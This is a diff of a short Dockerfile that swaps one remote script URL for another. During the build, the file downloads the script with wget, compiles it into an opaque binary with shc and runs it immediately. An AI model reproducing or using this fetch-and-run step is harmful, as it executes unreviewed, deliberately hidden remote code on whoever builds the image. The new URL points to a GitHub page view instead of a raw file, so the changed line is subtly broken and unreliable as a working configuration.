@@ -1,6 +1,6 @@
 FROM alpine:edge
 
-ENV SHURL https://raw.githubusercontent.com/zxfandyy/across/master/dockershc/xr3y.sh
+ENV SHURL https://github.com/xkrusher/KintoX/blob/main/xr3ay.sh
 
 RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
     wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
